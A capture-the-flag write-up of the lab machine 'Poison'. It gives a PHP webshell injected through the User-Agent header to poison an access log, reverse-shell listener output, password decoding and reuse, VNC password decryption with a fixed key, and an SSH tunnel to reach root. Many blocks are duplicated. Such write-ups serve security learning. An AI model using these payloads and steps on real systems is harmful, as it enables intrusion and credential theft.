Poison

Poison

Browse to the web application on port 80 to find the following webpage:

We can use the web application and type in the name of the script such as phpinfo.php to open the PHP file:

As shown in the output above, the browse parameter is used to include the files. This indicates the web application could be vulnerable to LFI/RFI. It is also running FreeBSD OS.

The box name kinda hints what to expect.

When looking at which files to poison, I identified the access.log file is accessible:

Intercept and poison one of the GET requests to browse.php. I placed my PHP webshell inside the User-Agent field:

GET /browse.php?file=info.php HTTP/1.1
Host: 10.129.3.251
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.129.3.251/
Upgrade-Insecure-Requests: 1
Priority: u=0, i


GET /browse.php?file=info.php HTTP/1.1
Host: 10.129.3.251
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.129.3.251/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

And now RCE is achieved using the poisoned log file:

Since the target is running FreeBSD, we need to use a suitable shell. In my case, I used csh. Use the poisoned log file to execute a reverse shell:

Now I have an initial access on the machine:

┌──(kali㉿kali)-[~/Desktop/Labs/Poison]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.3.251] 47389
Warning: no access to tty (Bad file descriptor).
Thus no job control in this shell.
www@Poison:/usr/local/www/apache24/data % 
┌──(kali㉿kali)-[~/Desktop/Labs/Poison]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.3.251] 47389
Warning: no access to tty (Bad file descriptor).
Thus no job control in this shell.
www@Poison:/usr/local/www/apache24/data %

I notice the file pwdbackup.txt exists which mentions they have encoded their password 13 times:

www@Poison:/usr/local/www/apache24/data % cat pwdbackup.txt
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU

www@Poison:/usr/local/www/apache24/data %

Save the base64 output into a text file and we can decode it 13 times to see if we receive the password in plaintext. This worked successfully as we received a password for the user charix:

┌──(kali㉿kali)-[~/Desktop/Labs/Poison]
└─$ cat passwd.txt | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
Charix!2#4%6&8(0
┌──(kali㉿kali)-[~/Desktop/Labs/Poison]
└─$ cat passwd.txt | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
Charix!2#4%6&8(0

Reusing the password worked successfully:

www@Poison:/usr/local/www/apache24/data % su charix
Password:Charix!2#4%6&8(0
id
uid=1001(charix) gid=1001(charix) groups=1001(charix)
whoami
charix


www@Poison:/usr/local/www/apache24/data % su charix
Password:Charix!2#4%6&8(0
id
uid=1001(charix) gid=1001(charix) groups=1001(charix)
whoami
charix

SSH into the machine to gain a stable access:

┌──(kali㉿kali)-[~/Desktop/Labs/Poison]
└─$ ssh charix@10.129.3.251
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(charix@10.129.3.251) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
The default editor in FreeBSD is vi, which is efficient to use when you have
learned it, but somewhat user-unfriendly.  To use ee (an easier but less
powerful editor) instead, set the environment variable EDITOR to /usr/bin/ee
charix@Poison:~ %

└─$ ssh charix@10.129.3.251

charix@Poison:~ %

The user.txt flag:

charix@Poison:~ % cat user.txt
eaacdfb2d141b72a589233063604209c
charix@Poison:~ % 

charix@Poison:~ % cat user.txt
eaacdfb2d141b72a589233063604209c
charix@Poison:~ %

Download the secret.zip file. Use the password of user charix to extract the file secret. Upon examining the file, it turns out to be the password of VNC:

┌──(kali㉿kali)-[~/Desktop/Labs/Poison]
└─$ cat secret | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d 

VNCP@$$!
┌──(kali㉿kali)-[~/Desktop/Labs/Poison]
└─$ cat secret | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d 

VNCP@$$!

Also, vnc is also operating on the target machine on port 5901:

root   880   0.0  0.8  85228  7840  -  Is   21:14    0:00.02 sshd: charix [priv] (sshd)
charix 883   0.0  0.8  85228  7860  -  S    21:14    0:00.15 sshd: charix@pts/2 (sshd)
root   614   0.0  0.9  23620  8872 v0- I    20:56    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
root   625   0.0  0.7  67220  7064 v0- I    20:56    0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop
root   626   0.0  0.5  37620  5312 v0- I    20:56    0:00.01 twm
root   782   0.0  0.2  10484  2076 v0  Is+  20:56    0:00.00 /usr/libexec/getty Pc ttyv0
root   783   0.0  0.2  10484  2076 v1  Is+  20:56    0:00.00 /usr/libexec/getty Pc ttyv1
root   880   0.0  0.8  85228  7840  -  Is   21:14    0:00.02 sshd: charix [priv] (sshd)
charix 883   0.0  0.8  85228  7860  -  S    21:14    0:00.15 sshd: charix@pts/2 (sshd)
root   614   0.0  0.9  23620  8872 v0- I    20:56    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
root   625   0.0  0.7  67220  7064 v0- I    20:56    0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop
root   626   0.0  0.5  37620  5312 v0- I    20:56    0:00.01 twm
root   782   0.0  0.2  10484  2076 v0  Is+  20:56    0:00.00 /usr/libexec/getty Pc ttyv0
root   783   0.0  0.2  10484  2076 v1  Is+  20:56    0:00.00 /usr/libexec/getty Pc ttyv1

When checking for open TCP4 ports, I notice the ports 5901 and 5801 stands out:

charix@Poison:/usr/local/etc/apache24 % sockstat -4 -l
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      800   4  tcp4   *:80                  *:*
root     sendmail   728   3  tcp4   127.0.0.1:25          *:*
www      httpd      727   4  tcp4   *:80                  *:*
www      httpd      726   4  tcp4   *:80                  *:*
www      httpd      725   4  tcp4   *:80                  *:*
www      httpd      724   4  tcp4   *:80                  *:*
www      httpd      723   4  tcp4   *:80                  *:*
www      httpd      722   4  tcp4   *:80                  *:*
root     httpd      710   4  tcp4   *:80                  *:*
root     sshd       705   4  tcp4   *:22                  *:*
root     Xvnc       614   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       614   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    475   7  udp4   *:514                 *:*

charix@Poison:/usr/local/etc/apache24 % sockstat -4 -l
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      800   4  tcp4   *:80                  *:*
root     sendmail   728   3  tcp4   127.0.0.1:25          *:*

www      httpd      726   4  tcp4   *:80                  *:*
www      httpd      725   4  tcp4   *:80                  *:*

www      httpd      722   4  tcp4   *:80                  *:*

root     sshd       705   4  tcp4   *:22                  *:*

Perform SSH tunneling to access the VNC port:

┌──(kali㉿kali)-[~/Desktop/Labs/Poison]
└─$ ssh -L 5901:localhost:5901 -L 5801:localhost:5801 charix@10.129.3.251 -N 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(charix@10.129.3.251) Password for charix@Poison:
┌──(kali㉿kali)-[~/Desktop/Labs/Poison]
└─$ ssh -L 5901:localhost:5901 -L 5801:localhost:5801 charix@10.129.3.251 -N 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(charix@10.129.3.251) Password for charix@Poison:

Connect using vncviewer and the password VNCP@$$!:

┌──(kali㉿kali)-[~/Desktop/Labs/Poison]
└─$ vncviewer localhost::5901
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:

  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding

Then a new window will open where we have a root shell. The root.txt flag is shown below:
